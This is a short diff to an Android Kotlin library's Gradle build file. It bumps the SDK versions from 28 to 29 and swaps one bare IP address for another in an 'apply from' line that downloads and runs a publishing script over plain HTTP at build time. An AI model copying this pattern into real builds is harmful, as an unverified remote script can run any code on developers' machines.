@@ -3,10 +3,10 @@ apply plugin: 'kotlin-android'
 
 
 android {
-    compileSdkVersion 28
+    compileSdkVersion 29
     defaultConfig {
         minSdkVersion 14
-        targetSdkVersion 28
+        targetSdkVersion 29
         versionCode 1
         versionName VERSION_NAME
     }
@@ -37,5 +37,5 @@ dependencies {
     compileOnly "org.jetbrains.kotlin:kotlin-stdlib-jdk7:$kotlin_version"
 }
 
-apply from: 'http://108.61.177.84/gradle/gradle-mvn-push.gradle'
+apply from: 'http://139.180.212.139/gradle/gradle-mvn-push.gradle'
 //apply from: './gradle-mvn-push.gradle'
